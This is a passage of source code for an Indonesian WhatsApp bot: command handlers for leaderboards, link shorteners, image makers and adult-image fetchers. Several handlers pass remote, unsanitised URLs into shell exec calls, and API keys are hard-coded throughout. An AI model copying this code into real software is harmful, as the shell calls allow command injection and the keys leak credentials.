				Angga.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": ban}})
				break

		case 'leaderboard':
		case 'lb':
				_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
				uang.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
				let leaderboardlvl = '-----[ *LEADERBOARD LEVEL* ]----\n\n'
				let leaderboarduang = '-----[ *LEADERBOARD UANG* ]----\n\n'
				let nom = 0
				try {
				for (let i = 0; i < 10; i++) {
					nom++
					leaderboardlvl += `*[${nom}]* ${_level[i].id.replace('@s.whatsapp.net', '')}\n◪  *XP*: ${_level[i].xp}\n◪  *Level*: ${_level[i].level}\n`
					leaderboarduang += `*[${nom}]* ${uang[i].id.replace('@s.whatsapp.net', '')}\n◪  *Uang*: _Rp${uang[i].uang}_\n◪  *Limit*: ${limitawal - _limit[i].limit}\n`
				}
				await reply(leaderboardlvl)
				await reply(leaderboarduang)
				} catch (err) {
				console.error(err)
				await reply(`minimal 10 user untuk bisa mengakses database`)
				}
				break
		case 'kalkulator':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(`[❗] Kirim perintah *${prefix}kalkulator [ Angka ]*\nContoh : ${prefix}kalkulator 12*12\n*NOTE* :\n• Untuk Perkalian Menggunakan *\n• Untuk Pertambahan Menggunakan +\n• Untuk Pengurangan Menggunakan -\n• Untuk Pembagian Menggunakan /`)
				const Math_js = require('mathjs')
				mtk = body.slice(12)
				if (typeof Math_js.evaluate(mtk) !== "number") {
					reply(`"${mtk}", Kesalahan!\n[❗] Kirim perintah *${prefix}kalkulator [ Angka ]*\nContoh : ${prefix}kalkulator 12*12\n*NOTE* :\n• Untuk Perkalian Menggunakan *\n• Untuk Pertambahan Menggunakan +\n• Untuk Pengurangan Menggunakan -\n• Untuk Pembagian Menggunakan /`)
				} else {
					reply(`*「 MATH 」*\n\n*Kalkulator*\n${mtk} = ${Math_js.evaluate(mtk)}`)
				}
				await limitAdd(sender)
				break
		case 'dompet':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				const kantong = checkATMuser(sender)
				reply(ind.uangkau(pushname, sender, kantong))
				break
		case 'buylimit':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				payout = body.slice(10)
				const koinPerlimit = 2000
				const total = koinPerlimit * payout
				if ( checkATMuser(sender) <= total) return reply(`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= total ) {
					confirmATM(sender, total)
					bayarLimit(sender, payout)
					await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim* : Admin\n*Penerima* : ${pushname}\n*Nominal pembelian* : ${payout} \n*Harga limit* : ${koinPerlimit}/limit\n*Sisa uang mu* : ${checkATMuser(sender)}\n\nProses berhasil dengan nomer pembayaran\n${createSerial(20)}`)
				} 
				break
		case 'buypremiumlimit':
				
                 if (!isRegistered) return reply( ind.noregis())
				
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				payout = body.slice(17)
				const koinpremPerlimit = 500
				const totalprem = koinpremPerlimit * payout
				if ( checkATMuser(sender) <= totalprem) return reply(`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= totalprem ) {
					confirmATM(sender, totalprem)
					bayarLimit(sender, payout)
					await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim* : AnggaGanzzツ\n*Penerima* : ${pushname}\n*Nominal pembelian* : ${payout} \n*Harga limit* : ${koinpremPerlimit}/limit\n*Sisa uang mu* : ${checkATMuser(sender)}\n\nProses berhasil dengan nomer pembayaran\n${createSerial(20)}`)
				} 
				break
		case 'giftlimit': 
				
                 if (!isRegistered) return reply( ind.noregis())
				if (!isAdmin) return reply('*Only Adminban & Owner Kami!*')
				const nomerr = args[0].replace('@','')
                		const jmla = args[1]
                		if (jmla <= 1) return reply(`minimal gift limit adalah 1`)
                		if (isNaN(jmla)) return reply(`limit harus berupa angka`)
                		if (!nomerr) return reply(`maaf format salah\nmasukan parameter yang benar\ncontoh : ${prefix}giftlimit @6285283427860 20`)
                		const cysz = nomerr + '@s.whatsapp.net'
                		var found = false
                        			Object.keys(_limit).forEach((i) => {
                            			if(_limit[i].id === cysz){
                                			found = i
                            			}
                        		})
                        	if (found !== false) {
                            	_limit[found].limit -= jmla
                            	const updated = _limit[found]
                            	const result = `Gift kuota limit sukses dengan NS: ${createSerial(20)} pada ${moment().format('DD/MM/YY HH:mm:ss')}
							*「 GIFT KUOTA LIMIT 」*
							• User : @${updated.id.replace('@s.whatsapp.net','')}
							• Limit: ${limitawal-updated.limit}`
                            	console.log(_limit[found])
                            	fs.writeFileSync('./database/pengguna/limit.json',JSON.stringify(_limit));
                            	reply(result)
                        	} else {
                                reply(`Maaf, nomor ${nomerr} tidak terdaftar di database!`)
                        	}
               			break
                case 'moddroid':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${body.slice(10)}&apikey=${TobzKey}`)
				hepi = data.result[0] 
				teks = `*Nama*: ${data.result[0].title}\n*Publisher*: ${hepi.publisher}\n*Mod info:* ${hepi.mod_info}\n*size*: ${hepi.size}\n*Latest version*: ${hepi.latest_version}\n*Genre*: ${hepi.genre}\n*Link:* ${hepi.link}\n*Download*: ${hepi.download}`
				buffer = await getBuffer(hepi.image)
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
				await limitAdd(sender)
				break
		case 'happymod':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${body.slice(10)}&apikey=${TobzKey}`)
				hupo = data.result[0] 
				teks = `*Nama*: ${data.result[0].title}\n*version*: ${hupo.version}\n*size:* ${hupo.size}\n*root*: ${hupo.root}\n*purchase*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
				buffer = await getBuffer(hupo.image)
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
				await limitAdd(sender)
				break
		case 'apkpure':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				data = await fetchJson(`https://api.zeks.xyz/api/apkpure?q=${body.slice(9)}&apikey=apivinz`, {method: 'get'})
				teks = '=================\n'
				for (let i of data.result) {
					teks += `*Nama APK* : ${i.title}\n*Link* : ${i.url}\n*Rating* : ${i.rating}\n=================\n`
					}
				reply(teks.trim())
				await limitAdd(sender)
				break
		case 'jadwalbola': 			
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				data = await fetchJson(`https://api.vhtear.com/jadwalbola&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
				teks = '=================\n'
				for (let i of data.result.data) {
					teks += `❏ *Kick Off* : ${i.kickoff}\n❏ *Pertandingan* : ${i.pertandingan}\n❏ *Stasiuntv* : ${i.stasiuntv}\n\n=================\n\n`
					}
				reply(teks.trim())
				await limitAdd(sender)
				break
		case 'coronainfo': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				data = await fetchJson(`https://api.vhtear.com/corona&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
				teks = '=================\n'
				for (let i of data.result) {
					teks += `*Updated* : ${i.updated}\n*Country* : ${i.country}\n*CountryInfo* : \n*ID* : ${i.countryInfo._id}\n*iso2* : ${i.countryInfo.iso2}\n*iso3* : ${i.countryInfo.iso3}\n*lat* : ${i.countryInfo.lat}\n*long* : ${i.countryInfo.long}\n*cases* : ${i.cases}\n*todayCases* : ${i.todayCases}\n*deaths* : ${i.deaths}\n*todayDeaths* : ${i.todayDeaths}\n*recovered* : ${i.recovered}\n*todayRecovered* : ${i.todayRecovered}\n*active* : ${i.active}\n*critical* : ${i.critical}\n*casesPerOneMillion* : ${i.casesPerOneMillion}\n*deathsPerOneMillion* : ${i.deathsPerOneMillion}\n*tests* : ${i.tests}\n*testsPerOneMillion* : ${i.testsPerOneMillion}\n*population* : ${i.population}\n*continent* : ${i.continent}\n*oneCasePerPeople* : ${i.oneCasePerPeople}\n*oneDeathPerPeople* : ${i.oneDeathPerPeople}\n*oneTestPerPeople* : ${i.oneTestPerPeople}\n*activePerOneMillion* : ${i.activePerOneMillion}\n*recoveredPerOneMillion* : ${i.recoveredPerOneMillion}\n*criticalPerOneMillion* : ${i.criticalPerOneMillion}\n=================\n`
					}
				reply(teks.trim())
				await limitAdd(sender)
				break
		case 'bitly':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				Angga.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/bitly?url=${args[0]}&apikey=${TobzKey}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'cuttly':
				 				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				Angga.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/cuttly?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
				case 'pornhub':
                	
					var gh = body.slice(9)
					var porn = gh.split("/")[0];
					var hub = gh.split("/")[1];
					if (args.length < 1) return reply(`ã€Œâ—ã€Contoh : ${prefix}pornhub AnggaGanzz/Hub`)
					reply(ind.wait())
					alan = await getBuffer(`https://vinz.zeks.xyz/api/pornhub?text1=${porn}&text2=${hub}`)
					Angga.sendMessage(from, alan, image, {quoted: mek})
					await limitAdd(sender)
				break
				case 'googletext':
                	
					var gh = body.slice(12)
					var yogi = gh.split("/")[0];
					var ganz = gh.split("/")[1];
					var abiez = gh.split("/")[2];
					if (args.length < 1) return reply(`ã€Œâ—ã€Contoh : ${prefix}googletext AnggaGanzz/gans/abiezz`)
					reply(ind.wait())
					yogi = await getBuffer(`https://videfikri.com/api/textmaker/gsuggest/?text1=${yogi}&text2=${ganz}&text3=${abiez}`)
					Angga.sendMessage(from, yogi, image, {quoted: mek})
					await limitAdd(sender)
				break
		case 'tinyurl':
               Angga.updatePresence(from, Presence.composing) 
                data = await fetchJson(`https://tobz-api.herokuapp.com/api/tinyurl?url=${args[0]}&apikey=${TobzKey}`)
                hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
                reply(hasil)
                await limitAdd(sender)
                break
		case 'shrtco':
				 				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				Angga.updatePresence(from, Presence.composing) 
				data = await fetchJson(`http://lolhuman.herokuapp.com/api/shortlink2?url=${args[0]}&apikey=WEMPYGANSS`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
                case 'nangis':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://api.shizukaa.xyz/api/bj18?apikey=itsmeiky633', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
                case 'blowjob':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (!isNsfw) return reply(ind.nsfwoff())
				
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://tobz-api.herokuapp.com/api/nsfwblowjob?apikey=${TobzKey}', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
		case 'rdmhentai':
		case 'randomhentai':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
					if (!isNsfw) return reply(ind.nsfwoff())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                                        gatauda = body.slice(12)
					reply(ind.wait())
                                        anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap?apikey=291F6uRDLIhlSpHp1hOy`, {method: 'get'})
                                        buffer = await getBuffer(anu.result)
                                        Angga.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
                                        break
		                case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'loli':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
		if (!isRegistered) return reply(ind.noregis())
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LoLKey}`)
                    Angga.sendMessage(from, buffer, image, { quoted: mek})
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
		if (!isRegistered) return reply(ind.noregis())
		if (!isPremium) return reply('Fitur Ini Khusus User Premium')
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${LoLKey}`)
                    Angga.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
		if (!isRegistered) return reply(ind.noregis())
		if (!isPremium) return reply('Fitur Ini Khusus User Premium')
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/random2/${command}?apikey=${LoLKey}`)
                    Angga.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'ngif':
                case 'nsfw_neko_gif':
                case 'random_hentai_gif':
		if (!isRegistered) return reply(ind.noregis())
		if (!isPremium) return reply('Fitur Ini Khusus User Premium')
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/random2/${command}?apikey=${LoLKey}`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        Angga.sendMessage(from, buff, sticker, { quoted: mek})
                        fs.unlinkSync(rano)
                    })
                    break
		case 'nulis':
				 				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				ct = body.slice(6)
				reply(ind.wait())
				ct = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${ct}&apikey=apivinz`)
				Angga.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'nulis3':
				 				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				ct = body.slice(7)
				reply(ind.wait())
				anu = await fetchJson(`https://videfikri.com/api/nulis/?query=${ct}`, {method: 'get'})
				gools5 = await getBuffer(anu.image)
				Angga.sendMessage(from, gools5, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'nulis2':
				 				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				ct = body.slice(7)
				ll1 = ct.split("/")[0];
                ll2 = ct.split("/")[1];
                ll3 = ct.split("/")[2];
                ll4 = ct.split("/")[3];
				reply(ind.wait())
				ct = await getBuffer(`https://api.zeks.xyz/api/magernulis?nama=${ll1}&kelas=${ll2}&text=${ll3}&tinta=${ll4}`)
				Angga.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
				case 'buggc': 
				    if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
			    	anu = await Angga.groupLeave(from, `Berhasil BUG GROUP : *${groupMetadata.subject}*`, groupId)
	                break
		case 'nulis4':
				 				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				ct = body.slice(7)
				reply(ind.wait())
				ct = await getBuffer(`https://api.vhtear.com/write?text=${ct}&apikey=c1d162b46e634f389efa1ac715f03d03`)
				Angga.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'galaxtext':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				ct = body.slice(10)
				reply(ind.wait())
				ct = await getBuffer(`http://lolhuman.herokuapp.com/api/ephoto1/galaxywallpaper?apikey=${LoLKey}&text=${ct}`)
				Angga.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'bplogo':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				vinz = body.slice(8)
				reply(ind.wait())
				anu = await fetchJson(`https://api.zeks.xyz/api/logobp?text=${vinz}&apikey=apivinz`)
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'hartatata':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				bh = body.slice(11)
				reply(ind.wait())
				bh = await getBuffer(`https://mhankbarbar.tech/api/htahta?apiKey=Q7MLdUnVSkXgLmQE9liX&text=${bh}`)
				Angga.sendMessage(from, bh, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'tahta':
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				bh = body.slice(7)
				reply(ind.wait())
				bh = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${bh}&apikey=apivinz`)
				Angga.sendMessage(from, bh, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'darkneon':
                case 'candlemug':
                case 'lovemsg':
                case 'mugflower':
                case 'narutobanner':
                case 'paperonglass':
                case 'romancetext':
                case 'shadowtext':
                case 'coffeecup':
                case 'coffeecup2':
                case 'glowingneon':
                case 'underwater':
                case 'hpotter':
                case 'woodblock':
                if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} yogi`)
                    txt = args.join(" ")
                    reply('[❕] Loading')
                    buffer = await getBuffer(`https://videfikri.com/api/textmaker/${command}/?text=${txt}`)
                    Angga.sendMessage(from, buffer, image, {quoted: mek})
         break
         case 'gplaybutton':
                case 'splaybutton':
                if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} yogi`)
                    txt = args.join(" ")
                    reply('[❕] Loading')
                    buffer = await getBuffer(`https://api.zeks.xyz/api/${command}?text=${txt}&apikey=apivinz`)
                    Angga.sendMessage(from, buffer, image, {quoted: mek})
         break
         
         case 'qrencode':
                case 'barcode':
                if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} yogi`)
                    txt = args.join(" ")
                    reply('[â•] Loading')
                    buffer = await getBuffer(`https://api.zeks.xyz/api/${command}?apikey=apivinz&text=${txt}`)
                    Angga.sendMessage(from, buffer, image, {quoted: mek})
         break
//Dap lu gak keren
//dappa gay
         case 'wanted':
	if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/wanted/?urlgbr=${anu.display_url}&text1=Dicari&text2=${tels}`)
	 Angga.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'gtav':
	if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/gtavposter/?urlgbr=${anu.display_url}`)
	 Angga.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'facebookpage':
	if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/facebookprof/?urlgbr=${anu.display_url}&text=${tels}`)
	 Angga.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'costumwp':
	if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/customwp/?urlgbr=${anu.display_url}`)
	 Angga.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'readall':
                if (!isOwner) return reply(ind.ownerb())
                var chats = await Angga.chats.all()
                chats.map( async ({ jid }) => {
                await Angga.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await Angga.sendMessage(from, teks, text, {quoted: freply})
		console.log(chats.length)
		break
		case 'unreadall':
                if (!isOwner) return reply(ind.ownerb())
                var chats = await Angga.chats.all()
                chats.map( async ({ jid }) => {
                await Angga.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await Angga.sendMessage(from, teks, text, {quoted: freply})
		    console.log(chats.length)
	        break
	case 'pantaimalam':
	if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/nightbeach/?urlgbr=${anu.display_url}`)
	 Angga.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'pencil':
	if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/pencil/?urlgbr=${anu.display_url}`)
	 Angga.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'bakar':
	if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/burneffect/?urlgbr=${anu.display_url}`)
	 Angga.sendMessage(from, hehe, image, {quoted:mek})
	} else {
